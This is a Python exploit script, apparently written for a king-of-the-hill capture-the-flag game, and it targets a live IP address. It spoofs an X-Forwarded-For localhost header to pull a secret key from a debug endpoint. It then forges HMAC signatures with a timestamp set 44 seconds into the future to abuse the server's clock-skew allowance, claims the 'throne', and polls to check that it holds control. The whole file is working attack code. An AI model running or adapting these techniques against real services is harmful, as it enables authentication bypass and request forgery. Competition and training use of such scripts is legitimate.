import requests, hmac, hashlib, time, email.utils
B="http://13.37.197.230:28490"; TEAM="842d0f131b6b020f"
s=requests.Session()
def key(): return s.get(B+"/debug",headers={"X-Forwarded-For":"127.0.0.1"},timeout=10).json()["hill_key"]
def off():
    d=s.get(B+"/status",timeout=10).headers.get("Date")
    return int(email.utils.parsedate_to_datetime(d).timestamp())-int(time.time()) if d else 0
def sign(k,ts): return hmac.new(k.encode(),f"{TEAM}|{ts}".encode(),hashlib.sha1).hexdigest()
K=key(); O=off()
# post one claim with ts = now+44 (max future in skew)
ts=int(time.time())+O+44
r=s.post(B+"/throne",json={"team":TEAM,"ts":ts,"sig":sign(K,ts)},timeout=10)
print("seize future ts=%d -> %s %s"%(ts,r.status_code,r.text))
# observe who is king for 20s without reposting
mine=0;tot=0
for i in range(20):
    st=s.get(B+"/status",timeout=10).json()
    m=st.get("king","").startswith(TEAM[:8]); mine+=m; tot+=1
    print("t+%02ds king=%s mine=%s claims=%s"%(i,st.get("king"),m,st.get("claims")))
    time.sleep(1)
print("HELD %d/%d ticks-ish without reposting"%(mine,tot))
